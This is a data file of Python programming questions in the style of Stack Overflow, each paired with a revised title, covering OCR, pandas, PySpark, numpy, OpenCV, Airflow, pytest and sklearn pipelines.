Python OCR - pytesseract fail to recognise digits from image," I've this python code which I use to convert a text written in a picture to a string, it does work for certain images which have large characters, but not for the one I'm trying right now which contains only digits.This is the picture:This is my code: Why is it failing at recognising this specific image and how can I solve this problem? <code>  import pytesseractfrom PIL import Imageimg = Image.open('img.png')pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files (x86)/Tesseract-OCR/tesseract'result = pytesseract.image_to_string(img)print (result)",Why does pytesseract fail to recognise digits from image with darker background?
Python - pytesseract fail to recognise digits from image," I've this python code which I use to convert a text written in a picture to a string, it does work for certain images which have large characters, but not for the one I'm trying right now which contains only digits.This is the picture:This is my code: Why is it failing at recognising this specific image and how can I solve this problem? <code>  import pytesseractfrom PIL import Imageimg = Image.open('img.png')pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files (x86)/Tesseract-OCR/tesseract'result = pytesseract.image_to_string(img)print (result)",Why does pytesseract fail to recognise digits from image with darker background?
pytesseract fail to recognise digits from image," I've this python code which I use to convert a text written in a picture to a string, it does work for certain images which have large characters, but not for the one I'm trying right now which contains only digits.This is the picture:This is my code: Why is it failing at recognising this specific image and how can I solve this problem? <code>  import pytesseractfrom PIL import Imageimg = Image.open('img.png')pytesseract.pytesseract.tesseract_cmd = 'C:/Program Files (x86)/Tesseract-OCR/tesseract'result = pytesseract.image_to_string(img)print (result)",Why does pytesseract fail to recognise digits from image with darker background?
resample with categories in pandas," I have hourly data, of variable x for 3 types, and Category column, and ds is set as index. I want to resample it to Week. But if I use df2 = df.resample('W').mean(), it simply drops 'Category' Column. <code>  > dfds Category X2010-01-01 01:00:00 A 322010-01-01 01:00:00 B 132010-01-01 01:00:00 C 092010-01-01 02:00:00 A 122010-01-01 02:00:00 B 622010-01-01 02:00:00 C 12","Resample with categories in pandas, keep non-numerical columns"
When to use a UDF verus a function in PySpark," I'm using Spark with Databricks and have the following code: Both of these next statements work: and using a UDF: It is unclear to me from the documentation when I should use one over the other and why? <code>  def replaceBlanksWithNulls(column): return when(col(column) != """", col(column)).otherwise(None) x = rawSmallDf.withColumn(""z"", replaceBlanksWithNulls(""z"")) replaceBlanksWithNulls_Udf = udf(replaceBlanksWithNulls)y = rawSmallDf.withColumn(""z"", replaceBlanksWithNulls_Udf(""z""))",When to use a UDF versus a function in PySpark?
Selenium chrome extension python," What I have now is: I am able to open the webdriver and I see the extension that I added on the right top corner in google Chrome, however the driver doesn't go to google.com. I have searched a lot and I can't find the solution to it.Here is the link to the extension:https://chrome.google.com/webstore/detail/buster-captcha-solver-for/mpbjkejclgfgadiemmefgebjfooflfhl/relatedWatch the video here for complete information <code>  chrome_options = Options()chrome_options.add_extension(r""C:\Users\x\OneDrive\Desktop\pp\crxSolver.crx"")driver = webdriver.Chrome(r'C:\Users\x\OneDrive\Desktop\chromedriver.exe', options=chrome_options)driver.get(""https://www.google.com"")",Selenium Chromedriver not navigating to url
get module instance given its vars dict," Suppose I have the dict of a module (via vars(mod), or mod.__dict__, or globals()), e.g.: Given the dict d, how can I get back the module mod? I.e. I want to write a function get_mod_from_dict(d), which returns the module if the dict belongs to a module, or None: If get_mod_from_dict returns a module, I must have that this holds: I actually can implement it like this: However, this seems inefficient to me, to iterate through sys.modules.Is there a better way?Why do I need this?In some cases, you get access to the dict only. E.g. in the stack frames. And then, depending on what you want to do, maybe just for inspection/debugging purpose, it is helpful to get back the module.I wrote some extension to Pickler which can pickle methods, functions, etc. Some of these have references to the module, or the module dict. Wherever I have a dict which belongs to a module during pickling, I don't want to pickle the dict, but instead a reference to the module. <code>  import modd = vars(mod) >>> get_mod_from_dict(d)<module 'mod'> mod = get_mod_from_dict(d)assert mod is None or mod.__dict__ is d def get_mod_from_dict(d): mods = {id(mod.__dict__): mod for (modname, mod) in sys.modules.items() if mod and modname != ""__main__""} return mods.get(id(d), None)",Get module instance given its vars dict
How to run Python on AMD GPU, We are currently trying to optimize a system in which there are at least 12 variables. Total comibination of these variable is over 1 billion. This is not deep learning or machine learning or Tensorflow or whatsoever but arbitrary calculation on time series data. We have implemented our code in Python and successfully run it on CPU. We also tried multiprocessing which also works well but we need faster computation since calculation takes weeks. We have a GPU system consisting of 6 AMD GPUs. We would like to run our code on this GPU system but do not know how to do so. My questions are:Can we run our simple Python code on my AMD supported laptop?Can we run the same app on our GPU system?We read that we need to adjust the code for GPU computation but we do not know how to do that.PS: I can add more information if you need. I tried to keep the post as simple as possible to avoid conflict. <code> ,How to run Python on AMD GPU?
Return the indices of arrays in a 2D numpy array with a value greater than x," I have a large 2D numpy array and want to find the indices of the 1D arrays inside it that meet a condition: e.g., have at least a value greater than a given threshold x.I already can do it the following way but is there a shorter, more efficient way to do it? <code>  import numpya = numpy.array([[1,2,3,4,5], [1,2,3,4,20], [1,2,2,4,5]])indices = []i = 0x = 10for item in a: if any(j > x for j in item): indices.append(i) i += 1print(indices) # gives [1]",Find indices of 2D numpy arrays that meet a condition
Return the indices of arrays in a 2D numpy array that meet a condition," I have a large 2D numpy array and want to find the indices of the 1D arrays inside it that meet a condition: e.g., have at least a value greater than a given threshold x.I already can do it the following way but is there a shorter, more efficient way to do it? <code>  import numpya = numpy.array([[1,2,3,4,5], [1,2,3,4,20], [1,2,2,4,5]])indices = []i = 0x = 10for item in a: if any(j > x for j in item): indices.append(i) i += 1print(indices) # gives [1]",Find indices of 2D numpy arrays that meet a condition
How can I control the parallelism or concurrency of an Airflow DAG?," In some of my Apache Airflow installations, DAGs or tasks that are scheduled to run do not run even when the scheduler doesn't appear to be fully loaded. How can I increase the number of DAGs or tasks that can run concurrently?Similarly, if my installation is under high load and I want to limit how quickly my Airflow workers pull queued tasks (such as to reduce resource consumption), what can I adjust to reduce the average load? <code> ",How to control the parallelism or concurrency of an Airflow installation?
"How to suppress warning ""Access to protected member"" in pycharm in equals() method?"," I have some class Pycharm doesn't like that I access other._data because it is private. ""Access to protected member""This doesn't make sense to me, because the access is made from within the class.How do I either suppress this warning, or write correct code? <code>  class A(object): def __init__(self, data): self._data = data def _equals(self, other): return self._data == other._data","How to suppress warning ""Access to protected member"" in pycharm method?"
Pyaudio Cant be imported," I've installed the module pyaudio using pip. However, when I try to import it, Python says the module is not found: Why can't Python find the installed module?(I am using Python 3.7.) <code>  C:\Users\hp>pip install pyaudioRequirement already satisfied: pyaudio in c:\users\hp\appdata\local\programs\python\python37\lib\site-packages (0.2.11) >>> import pyaudioTraceback (most recent call last): File ""<stdin>"", line 1, in <module>ModuleNotFoundError: No module named 'pyaudio'",ModuleNotFoundError: No module named 'pyaudio' (Windows)
Pyaudio Can't be imported," I've installed the module pyaudio using pip. However, when I try to import it, Python says the module is not found: Why can't Python find the installed module?(I am using Python 3.7.) <code>  C:\Users\hp>pip install pyaudioRequirement already satisfied: pyaudio in c:\users\hp\appdata\local\programs\python\python37\lib\site-packages (0.2.11) >>> import pyaudioTraceback (most recent call last): File ""<stdin>"", line 1, in <module>ModuleNotFoundError: No module named 'pyaudio'",ModuleNotFoundError: No module named 'pyaudio' (Windows)
Why python Bisect Module gives wrong result?," I want to find if a number exists in a sorted array. To be straight an array contains fibonaccci number from 1 to 63. Below is the fibonacci number generator and some of it's output. Now i want to find if number 7 exists or not so i used the following codeusing python bisection module Again if i just write a simple binary search it gives me correct result as follows: So what is happening? <code>  stacksize = 10000 # default 128 stackfrom functools import lru_cache@lru_cache(stacksize)def nthfibonacci(n): if n <= 1: return 1 elif n == 2: return 1 elif n > 2: return nthfibonacci(n - 2) + nthfibonacci(n - 1) output = [nthfibonacci(k) for k in range(1,63+1)] # truncated output: [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610,987, 1597, 2584, 4181, 6765, 10946, 17711, 28657, 46368,.....] from bisect import bisect_leftelem_index = bisect_left(a=output, x=7, lo=0, hi=len(arr) - 1) # output of elem_index is 5 ???? . But it is expected to be len(output) +1, right? # as we know if element is not found it returns len(array) +1 def binsearch(arr, key): # arr.sort() low = 0 high = len(arr) - 1 while low <= high: mid = (low + high) // 2 if arr[mid] == key: return mid else: if arr[mid] < key: low = mid + 1 else: high = mid - 1 return -1print(binsearch(arr, 7)) # it gives me -1 as expected",Why does python's bisect_left return a valid index even if the value does not exist?
Leave only the largest blob in an image with python," I have a binary image of a brain. I only want to leave the blob in the center and remove the surrounding ""noise"" that is in this circular looking shape.Here's an example image:I tried using OpenCV and getting countours, but that failed miserably. I also don't need a bounding rectangle box, at all, I just want to leave the center blob in the image, as it looks in the image I provided, and remove the surrounding noise/circle. Is this possible? <code> ",How to leave only the largest blob in an image?
Type hints and chained assignment in Python," I guess these two questions are related, so I'll post them together:1.- Is it possible to put type hint in chained assignments?These two attempts failed: 2.- Is it possible to put type hint in multiple assignments?These were my attempts: I am aware that in both cases the type is inferred from the type hint of a, but I have a long variable list (in the __init__ of a class) and I want to be extra-explicit.I am using Python 3.6.8. <code>  >>> def foo(a:int):... b: int = c:int = a File ""<stdin>"", line 2 b: int = c:int = a ^SyntaxError: invalid syntax>>> def foo(a:int):... b = c:int = a File ""<stdin>"", line 2 b = c:int = a ^SyntaxError: invalid syntax >>> from typing import Tuple>>> def bar(a: Tuple[int]):... b: int, c:int = a File ""<stdin>"", line 2 b: int, c:int = a ^SyntaxError: invalid syntax>>> def bar(a: Tuple[int]):... b, c:Tuple[int] = a... File ""<stdin>"", line 2SyntaxError: only single target (not tuple) can be annotated>>> def bar(a: Tuple[int]):... b, c:int = a... File ""<stdin>"", line 2SyntaxError: only single target (not tuple) can be annotated",Type hints and chained assignment and multiple assignments
Type hints and chained assignment and multiple assignments in Python," I guess these two questions are related, so I'll post them together:1.- Is it possible to put type hint in chained assignments?These two attempts failed: 2.- Is it possible to put type hint in multiple assignments?These were my attempts: I am aware that in both cases the type is inferred from the type hint of a, but I have a long variable list (in the __init__ of a class) and I want to be extra-explicit.I am using Python 3.6.8. <code>  >>> def foo(a:int):... b: int = c:int = a File ""<stdin>"", line 2 b: int = c:int = a ^SyntaxError: invalid syntax>>> def foo(a:int):... b = c:int = a File ""<stdin>"", line 2 b = c:int = a ^SyntaxError: invalid syntax >>> from typing import Tuple>>> def bar(a: Tuple[int]):... b: int, c:int = a File ""<stdin>"", line 2 b: int, c:int = a ^SyntaxError: invalid syntax>>> def bar(a: Tuple[int]):... b, c:Tuple[int] = a... File ""<stdin>"", line 2SyntaxError: only single target (not tuple) can be annotated>>> def bar(a: Tuple[int]):... b, c:int = a... File ""<stdin>"", line 2SyntaxError: only single target (not tuple) can be annotated",Type hints and chained assignment and multiple assignments
Why would we use to(device) method in pytorch?, I've seen this method multiple times. What are the purposes and advantages of doing this? <code> ,Why would we use to() method in pytorch?
Finding all possible combinations whose sum is within certain range of target (Python)," So I talked with some colleagues and the problem I currently have is actually quite challenging. The context behind this problem has to do with mass spectrometry and assigning structure to different peaks that the software gives.But to break it down into a optimization problem, I have a certain target value. I also have a list of various inputs whose sum I want to be as close as possible to the target as possible.So as an example, here is what I have. I want to find all the possible combinations of the inputs listed whose sum is within 0.5 of 1800.71. So the sum can be anywhere between 1800.21 and 1801.21. I already know two inputs could be: and I'm NOT looking to find the combination that gets me as close as possible to the target value; I am interested in ALL the possible combinations that are within 0.5 of the target value.If anyone could help me with this problem I would greatly appreciate it! <code>  List of inputs: [18.01, 42.01, 132.04, 162.05, 203.08, 176.03]Target value: 1800.71 [18.01, 162.05, 162.05, 162.05, 162.05, 162.05, 162.05, 162.05, 162.05, 162.05, 162.05, 162.05] **which gives a sum of 1800.59** [18.01, 18.01, 203.08, 203.08, 203.08, 162.05, 203.08, 18.01, 18.01, 18.01, 18.01, 18.01, 18.01, 18.01, 18.01, 18.01, 18.01, 42.01, 162.05, 203.08, 203.08] **which gives a sum 1800.71**",Finding all possible combinations whose sum is within certain range of target
ERROR at setup of TestWebsockets.test_authorized_user_can_connect," Following tutorial on https://testdriven.io/, I have created a websocket test for testing my websocket connection: I have created pytest.ini: but whenever I run pytest, I just got this error: I'm complete new to testing and all; I'm not even sure how it works, I have tried researching a bit but didn't understand the concepts and there is no particular thing which sorts this out. <code>  # tests/test_websockets.pyfrom django.contrib.auth import get_user_modelfrom django.contrib.auth.models import Groupfrom django.test import Clientfrom channels.db import database_sync_to_asyncfrom channels.layers import get_channel_layerfrom channels.testing import WebsocketCommunicatorfrom nose.tools import assert_equal, assert_is_none, assert_is_not_none, assert_trueimport pytestfrom dc_wb.routing import applicationfrom posts.models import TripTEST_CHANNEL_LAYERS = { 'default': { 'BACKEND': 'channels.layers.InMemoryChannelLayer', },}@database_sync_to_asyncdef create_user(*,username='rider@example.com',password='pAssw0rd!',group='rider'): # Create user. user = get_user_model().objects.create_user( username=username, password=password ) # Create user group. user_group, _ = Group.objects.get_or_create(name=group) user.groups.add(user_group) user.save() return user@pytest.mark.asyncio@pytest.mark.django_db(transaction=True)class TestWebsockets: async def test_authorized_user_can_connect(self, settings): # Use in-memory channel layers for testing. settings.CHANNEL_LAYERS = TEST_CHANNEL_LAYERS print(settings.CHANNEL_LAYERS) # Force authentication to get session ID. client = Client() user = await create_user() client.force_login(user=user) # Pass session ID in headers to authenticate. communicator = WebsocketCommunicator( application=application, path='/taxi/', headers=[( b'cookie', f'sessionid={client.cookies[""sessionid""].value}'.encode('ascii') )] ) connected, _ = await communicator.connect() assert_true(connected) await communicator.disconnect() [pytest]DJANGO_SETTINGS_MODULE = dc_wb.settingspython_files = test_websockets.py collected 1 item trips/tests/test_websockets.py E [100%]===================================================================================================== ERRORS ======================================================================================================________________________________________________________________________ ERROR at setup of TestWebsockets.test_authorized_user_can_connect ________________________________________________________________________request = <SubRequest '_django_db_marker' for <Function test_authorized_user_can_connect>> @pytest.fixture(autouse=True) def _django_db_marker(request): """"""Implement the django_db marker, internal to pytest-django. This will dynamically request the ``db``, ``transactional_db`` or ``django_db_reset_sequences`` fixtures as required by the django_db marker. """""" marker = request.node.get_closest_marker(""django_db"") if marker: transaction, reset_sequences = validate_django_db(marker) if reset_sequences: request.getfixturevalue(""django_db_reset_sequences"") elif transaction:> request.getfixturevalue(""transactional_db"")../env/lib/python3.7/site-packages/pytest_django/plugin.py:483: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _request = <SubRequest 'transactional_db' for <Function test_authorized_user_can_connect>>, django_db_setup = None, django_db_blocker = <pytest_django.plugin._DatabaseBlocker object at 0x7f743c9e09e8> @pytest.fixture(scope=""function"") def transactional_db(request, django_db_setup, django_db_blocker): """"""Require a django test database with transaction support. This will re-initialise the django database for each test and is thus slower than the normal ``db`` fixture. If you want to use the database with transactions you must request this resource. If multiple database fixtures are requested, they take precedence over each other in the following order (the last one wins): ``db``, ``transactional_db``, ``django_db_reset_sequences``. """"""> if ""django_db_reset_sequences"" in request.funcargnames:E pytest.PytestDeprecationWarning: The `funcargnames` attribute was an alias for `fixturenames`, since pytest 2.3 - use the newer attribute instead.../env/lib/python3.7/site-packages/pytest_django/fixtures.py:199: PytestDeprecationWarning================================================================================================ warnings summary =================================================================================================/tmp/taxi-app/server/env/lib/python3.7/site-packages/nose/importer.py:12 /tmp/taxi-app/server/env/lib/python3.7/site-packages/nose/importer.py:12: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses from imp import find_module, load_module, acquire_lock, release_lock-- Docs: https://docs.pytest.org/en/latest/warnings.html======================================================================================= 1 warnings, 1 error in 0.32 seconds =======================================================================================",PytestDeprecationWarning at test setup: the funcargnames attribute was an alias for fixturenames
"Sentiment analysis Pipeline, problem getting the correct features names when dimensionality reduction is used"," In the following example I use a twitter dataset to perform sentiment analysis. I use sklearn pipeline to perform a sequence of transformations, add features and add a classifer. The final step is to visualise the words that have the higher predictive power. It works fine when I don't use feature selection. However, when I do use it the results that I get make no sense. I suspect that when feature selection is applied the order of the text features changes. Is there a way to work around that?The code below has been updated to include the correct answer Before feature selectionAfter feature selectionTo use feature selection I change the following lines of code from to  <code>  from sklearn.base import BaseEstimator, TransformerMixinfrom sklearn.pipeline import Pipeline, FeatureUnionfeatures= [c for c in df.columns.values if c not in ['target']]target = 'target'#train test splitX_train, X_test, y_train, y_test = train_test_split(df[features], df[target], test_size=0.2,stratify = df5[target], random_state=0)#Create classes which allow to select specific columns from the dataframeclass NumberSelector(BaseEstimator, TransformerMixin): def __init__(self, key): self.key = key def fit(self, X, y=None): return self def transform(self, X): return X[[self.key]]class TextSelector(BaseEstimator, TransformerMixin): def __init__(self, key): self.key = key def fit(self, X, y=None): return self def transform(self, X): return X[self.key]class ColumnExtractor(TransformerMixin): def __init__(self, cols): self.cols = cols def fit(self, X, y=None): # stateless transformer return self def transform(self, X): # assumes X is a DataFrame Xcols = X[self.cols] return Xcolsclass DummyTransformer(TransformerMixin): def __init__(self): self.dv = None def fit(self, X, y=None): # assumes all columns of X are strings Xdict = X.to_dict('records') self.dv = DictVectorizer(sparse=False) self.dv.fit(Xdict) return self def transform(self, X): # assumes X is a DataFrame Xdict = X.to_dict('records') Xt = self.dv.transform(Xdict) cols = self.dv.get_feature_names() Xdum = pd.DataFrame(Xt, index=X.index, columns=cols) # drop column indicating NaNs nan_cols = [c for c in cols if '=' not in c] Xdum = Xdum.drop(nan_cols, axis=1) Xdum.drop(list(Xdum.filter(regex = 'unknown')), axis = 1, inplace = True) return Xdumdef pipelinize(function, active=True): def list_comprehend_a_function(list_or_series, active=True): if active: return [function(i) for i in list_or_series] else: # if it's not active, just pass it right back return list_or_series return FunctionTransformer(list_comprehend_a_function, validate=False, kw_args={'active':active})#function to plot the coeficients of the words in the text with the highest predictive powerdef plot_coefficients(classifier, feature_names, top_features=50): if classifier.__class__.__name__ == 'SVC': coef = classifier.coef_ coef2 = coef.toarray().ravel() coef1 = coef2[:len(feature_names)] else: coef1 = classifier.coef_.ravel() top_positive_coefficients = np.argsort(coef1)[-top_features:] top_negative_coefficients = np.argsort(coef1)[:top_features] top_coefficients = np.hstack([top_negative_coefficients, top_positive_coefficients]) # create plot plt.figure(figsize=(15, 5)) colors = ['red' if c < 0 else 'blue' for c in coef1[top_coefficients]] plt.bar(np.arange(2 * top_features), coef1[top_coefficients], color=colors) feature_names = np.array(feature_names) plt.xticks(np.arange(1, 1 + 2 * top_features), feature_names[top_coefficients], rotation=90, ha='right') plt.show()#create a custome stopwords liststop_list = stopwords(remove_stop_word ,add_stop_word )#vectorizertfidf=TfidfVectorizer(sublinear_tf=True, stop_words = set(stop_list),ngram_range = (1,2))#categorical featuresCAT_FEATS = ['location','account']#dimensionality reductionpca = TruncatedSVD(n_components=200)#scaler for numerical featuresscaler = StandardScaler()#classifiermodel = SVC(kernel = 'linear', probability=True, C=1, class_weight = 'balanced')text = Pipeline([('selector', TextSelector(key='content')),('text_preprocess', pipelinize(text_preprocessing)),('vectorizer',tfidf),('important_features',select)])followers = Pipeline([('selector', NumberSelector(key='followers')),('scaler', scaler)])location = Pipeline([('selector',ColumnExtractor(CAT_FEATS)),('scaler',DummyTransformer())])feats = FeatureUnion([('text', text), ('length', followers), ('location',location)])pipeline = Pipeline([('features',feats),('classifier', model)])pipeline.fit(X_train, y_train)preds = pipeline.predict(X_test)feature_names = text.named_steps['vectorizer'].get_feature_names()feature_names = np.array(feature_names)[text.named_steps['important_features'].get_support(True)]classifier = pipe.named_steps['classifier']plot_coefficients(classifier, feature_names) text = Pipeline([('selector', TextSelector(key='content')), ('text_preprocess', pipelinize(text_preprocessing)), ('vectorizer',tfidf)]) select = SelectKBest(f_classif, k=8000)text = Pipeline([('selector', TextSelector(key='content')), ('text_preprocess', pipelinize(text_preprocessing)), ('vectorizer',tfidf), ('important_features',select)])","Sentiment analysis Pipeline, problem getting the correct feature names when feature selection is used"
"Sentiment analysis Pipeline, problem getting the correct feature names when dimensionality reduction is used"," In the following example I use a twitter dataset to perform sentiment analysis. I use sklearn pipeline to perform a sequence of transformations, add features and add a classifer. The final step is to visualise the words that have the higher predictive power. It works fine when I don't use feature selection. However, when I do use it the results that I get make no sense. I suspect that when feature selection is applied the order of the text features changes. Is there a way to work around that?The code below has been updated to include the correct answer Before feature selectionAfter feature selectionTo use feature selection I change the following lines of code from to  <code>  from sklearn.base import BaseEstimator, TransformerMixinfrom sklearn.pipeline import Pipeline, FeatureUnionfeatures= [c for c in df.columns.values if c not in ['target']]target = 'target'#train test splitX_train, X_test, y_train, y_test = train_test_split(df[features], df[target], test_size=0.2,stratify = df5[target], random_state=0)#Create classes which allow to select specific columns from the dataframeclass NumberSelector(BaseEstimator, TransformerMixin): def __init__(self, key): self.key = key def fit(self, X, y=None): return self def transform(self, X): return X[[self.key]]class TextSelector(BaseEstimator, TransformerMixin): def __init__(self, key): self.key = key def fit(self, X, y=None): return self def transform(self, X): return X[self.key]class ColumnExtractor(TransformerMixin): def __init__(self, cols): self.cols = cols def fit(self, X, y=None): # stateless transformer return self def transform(self, X): # assumes X is a DataFrame Xcols = X[self.cols] return Xcolsclass DummyTransformer(TransformerMixin): def __init__(self): self.dv = None def fit(self, X, y=None): # assumes all columns of X are strings Xdict = X.to_dict('records') self.dv = DictVectorizer(sparse=False) self.dv.fit(Xdict) return self def transform(self, X): # assumes X is a DataFrame Xdict = X.to_dict('records') Xt = self.dv.transform(Xdict) cols = self.dv.get_feature_names() Xdum = pd.DataFrame(Xt, index=X.index, columns=cols) # drop column indicating NaNs nan_cols = [c for c in cols if '=' not in c] Xdum = Xdum.drop(nan_cols, axis=1) Xdum.drop(list(Xdum.filter(regex = 'unknown')), axis = 1, inplace = True) return Xdumdef pipelinize(function, active=True): def list_comprehend_a_function(list_or_series, active=True): if active: return [function(i) for i in list_or_series] else: # if it's not active, just pass it right back return list_or_series return FunctionTransformer(list_comprehend_a_function, validate=False, kw_args={'active':active})#function to plot the coeficients of the words in the text with the highest predictive powerdef plot_coefficients(classifier, feature_names, top_features=50): if classifier.__class__.__name__ == 'SVC': coef = classifier.coef_ coef2 = coef.toarray().ravel() coef1 = coef2[:len(feature_names)] else: coef1 = classifier.coef_.ravel() top_positive_coefficients = np.argsort(coef1)[-top_features:] top_negative_coefficients = np.argsort(coef1)[:top_features] top_coefficients = np.hstack([top_negative_coefficients, top_positive_coefficients]) # create plot plt.figure(figsize=(15, 5)) colors = ['red' if c < 0 else 'blue' for c in coef1[top_coefficients]] plt.bar(np.arange(2 * top_features), coef1[top_coefficients], color=colors) feature_names = np.array(feature_names) plt.xticks(np.arange(1, 1 + 2 * top_features), feature_names[top_coefficients], rotation=90, ha='right') plt.show()#create a custome stopwords liststop_list = stopwords(remove_stop_word ,add_stop_word )#vectorizertfidf=TfidfVectorizer(sublinear_tf=True, stop_words = set(stop_list),ngram_range = (1,2))#categorical featuresCAT_FEATS = ['location','account']#dimensionality reductionpca = TruncatedSVD(n_components=200)#scaler for numerical featuresscaler = StandardScaler()#classifiermodel = SVC(kernel = 'linear', probability=True, C=1, class_weight = 'balanced')text = Pipeline([('selector', TextSelector(key='content')),('text_preprocess', pipelinize(text_preprocessing)),('vectorizer',tfidf),('important_features',select)])followers = Pipeline([('selector', NumberSelector(key='followers')),('scaler', scaler)])location = Pipeline([('selector',ColumnExtractor(CAT_FEATS)),('scaler',DummyTransformer())])feats = FeatureUnion([('text', text), ('length', followers), ('location',location)])pipeline = Pipeline([('features',feats),('classifier', model)])pipeline.fit(X_train, y_train)preds = pipeline.predict(X_test)feature_names = text.named_steps['vectorizer'].get_feature_names()feature_names = np.array(feature_names)[text.named_steps['important_features'].get_support(True)]classifier = pipe.named_steps['classifier']plot_coefficients(classifier, feature_names) text = Pipeline([('selector', TextSelector(key='content')), ('text_preprocess', pipelinize(text_preprocessing)), ('vectorizer',tfidf)]) select = SelectKBest(f_classif, k=8000)text = Pipeline([('selector', TextSelector(key='content')), ('text_preprocess', pipelinize(text_preprocessing)), ('vectorizer',tfidf), ('important_features',select)])","Sentiment analysis Pipeline, problem getting the correct feature names when feature selection is used"
Draw and Perpendicular Line of Fixed Length at a Point of Another Line," I have two points A (10,20) and B (15,30). The points generate a line AB. I need to draw a perpendicular line, CD, on point B with a length of 6 (each direction 3 units) in Python. I already have some properties of line AB using the following code: How can I calculate the location of C and D. I need their X and Y value. The value of C and D will be used for accomplishing another objective using the Shapely library.  <code>  from scipy import statsx = [10,15]y = [20,30]slope, intercept, r_value, p_value, std_err = stats.linregress(x,y)",Draw perpendicular line of fixed length at a point of another line
VSCode: how to find all references of a variable in python?," I'd like a VS Code feature like Find Usages in Pycharm, which can find all reads and writes of a variable. Take a simple file for example: In Pycharm using ""Find Usages"" of self.bar: I've tried ""Find all references"" but it doesn't work:as it doesn't find if bar1 == self.bar:.Update: searching for just occurrences is not what I am asking, as it just matches keywords which includes other variables with same name and also occurrences in comments.Update: turns out to be a known issue in Microsoft python language server: github.com/microsoft/python-language-server/issues/1174 <code>  class Foo: def __init__(self, bar): self.bar = bar def do_something(self): bar1 = ""hhhhh"" if bar1 == self.bar: print(""do something"")",VS Code: How to find all references of a variable in python?
How to find all references of a variable in python?," I'd like a VS Code feature like Find Usages in Pycharm, which can find all reads and writes of a variable. Take a simple file for example: In Pycharm using ""Find Usages"" of self.bar: I've tried ""Find all references"" but it doesn't work:as it doesn't find if bar1 == self.bar:.Update: searching for just occurrences is not what I am asking, as it just matches keywords which includes other variables with same name and also occurrences in comments.Update: turns out to be a known issue in Microsoft python language server: github.com/microsoft/python-language-server/issues/1174 <code>  class Foo: def __init__(self, bar): self.bar = bar def do_something(self): bar1 = ""hhhhh"" if bar1 == self.bar: print(""do something"")",VS Code: How to find all references of a variable in python?
Is there a better way to detect horizontal lines in an image than with HoughlinesP()?," I have .pdf files that have been converted to .jpg images for this project. My goal is to identify the blanks (e.g ____________) that you would generally find in a .pdf form that indicate a space for the user to sign of fill out some kind of information. I have been using edge detection with the cv2.Canny() and cv2.HoughlinesP() functions. This works fairly well, but there are quite a few false positives that come about from seemingly nowhere. When I look at the 'edges' file it shows a bunch of noise around the other words. I'm uncertain where this noise comes from.Should I continue to tweak the parameters, or is there a better method to find the location of these blanks? <code> ",Detect horizontal blank lines in .pdf form image with OpenCV
Improve horizontal line detection in .pdf image with OpenCV," I have .pdf files that have been converted to .jpg images for this project. My goal is to identify the blanks (e.g ____________) that you would generally find in a .pdf form that indicate a space for the user to sign of fill out some kind of information. I have been using edge detection with the cv2.Canny() and cv2.HoughlinesP() functions. This works fairly well, but there are quite a few false positives that come about from seemingly nowhere. When I look at the 'edges' file it shows a bunch of noise around the other words. I'm uncertain where this noise comes from.Should I continue to tweak the parameters, or is there a better method to find the location of these blanks? <code> ",Detect horizontal blank lines in .pdf form image with OpenCV
output appears outside tab widget when using nbconvert on jupyter notebook," I created a notebook which should display plots in a tab widget. As far as I understand, to include something like plots in the tab widget, I need to wrap it in the output widget. In the notebook itself it works but when I convert it to html via nbconvert it produces the wrong output.Widgets like sliders, buttons or text appear within the tab widget where they should, but when I use the output widget to catch the plot (or even some text from a print() function) it appears before the tab environment which itself is then empty.This is the how it shoud look with one plot per tab (works in the notebook):Plots in tabs within notebookAnd this is how it looks after nbconvert (in html). The plots appear before the tab envorinment:Plots before tabs in htmlPlease note that nbconvert includes other widgets fine and also tabs with other content.This is the used code: Now this part works in the notebook but not in the html, but as you will see it seems to be related to the output widget, as I does not work with plots or printed text. However, if I use a different widget type (e.g. Text) it is displayed correctly in the notebook and the html output from nbconvert. So, is there something I can change to make this actually work? What I need in the end is a way to display N plots in N tabs... <code>  # Import librariesimport pandas as pdimport matplotlib.pyplot as pltimport ipywidgets as widgetsimport numpy as np# Generated data for plottingdata = pd.DataFrame()for i in range(5): data[i] = np.random.normal(size = 50) # This does not work with plotschildren = []for i in range(data.shape[1]): out = widgets.Output() with out: fig, axes = plt.subplots() data[i].hist(ax = axes) plt.show() children.append(out)tab = widgets.Tab()tab.children = childrenfor i in range(len(children)): tab.set_title(i, ""Plot "" + str(i))tab# And this does not work with printed outputchildren = []for i in range(5): out = widgets.Output() with out: print(""This is text"", i) children.append(out)tab = widgets.Tab()tab.children = childrenfor i in range(len(children)): tab.set_title(i, ""Text "" + str(i))tab # This works with the Text widgetchildren = []for i in range(5): out = widgets.Text(description=""P""+str(i)) children.append(out)tab = widgets.Tab()tab.children = childrenfor i in range(len(children)): tab.set_title(i, ""Text "" + str(i))tab",Output widget appears outside tab widget when using nbconvert on jupyter notebook with ipywidgets
How to extract individual channels from an RGB image - python," I found the opencv documentation to extract the single channels from an RGB image using the cv2.split (img) command, but it does not really return an image of the chosen channel. They all look like grayscale. Can someone help me? I enclose the photos. starting image = red channel extracted = Is it a correct extraction?Where is the full red channel - img? <code>  b = img[:,:,0]g = img[:,:,1]r = img[:,:,2]orb,g,r = cv2.split(img)",How to extract individual channels from an RGB image
